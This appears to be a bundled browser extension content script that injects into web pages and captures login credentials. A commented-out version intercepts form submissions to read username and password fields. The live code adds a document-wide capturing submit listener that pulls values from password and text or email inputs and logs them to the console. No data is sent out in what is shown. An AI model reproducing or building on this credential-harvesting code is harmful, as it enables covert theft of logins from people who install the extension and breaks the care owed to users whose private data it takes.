/******/ (() => { // webpackBootstrap
var __webpack_exports__ = {};
/*!********************************************!*\
  !*** ./src/contentScript/contentScript.js ***!
  \********************************************/
// TODO: content script
// content_script.js
console.log("====================================");
console.log("content script injected");
console.log("====================================");



                // getting data from websites where <form> tag is present
// function getCredentials(event) {
//   event.preventDefault(); // Prevent the default form submission behavior

//   const formElement = event.target;
//   let usernameField, passwordField;

//   // Loop through all input fields in the form
//   const inputs = formElement.getElementsByTagName("input");
//   for (let i = 0; i < inputs.length; i++) {
//     const input = inputs[i];

//     // Check if the input is a password field
//     if (input.type === "password") {
//       passwordField = input;
//     }
//     // Check if the input is a text or email field (common for usernames)
//     else if (input.type === "text" || input.type === "email") {
//       usernameField = input;
//     }

//     // If both username and password fields are found, exit the loop
//     if (usernameField && passwordField) {
//       break;
//     }
//   }

//   // If both fields are found, log their values
//   if (usernameField && passwordField) {
//     const username = usernameField.value;
//     const password = passwordField.value;

//     console.log("Username:", username);
//     console.log("Password:", password);

//   } else {
//     console.log("Username or password field not found.");
//   }
// }

// // Add event listener to the form submission
// const forms = document.getElementsByTagName("form");
// for (let i = 0; i < forms.length; i++) {
//   const form = forms[i];
//   form.addEventListener("submit", getCredentials);
// }


              // getting data from input

let usernameField = null;
let passwordField = null;
let finalusername = "";
let finalpassword = "";

function handleInputEvent(event) {
  const input = event.target;

  // Check if the input field is a password field
  if (input.type === "password") {
    passwordField = input;
  }
  // Check if the input field is a text or email field (common for usernames)
  else if (input.type === "text" || input.type === "email") {
    usernameField = input;
  }

  // If both username and password fields are found, log their values
  if (usernameField && passwordField) {
    const username = usernameField.value;
    const password = passwordField.value;
    finalusername = username;
    finalpassword = password;
  }

  console.log("username:", finalusername);
  console.log("password:", finalpassword);
}

// Add event listener to monitor user input on the entire document
document.addEventListener("submit", handleInputEvent, true);

/******/ })()
;
//# sourceMappingURL=contentScript.js.map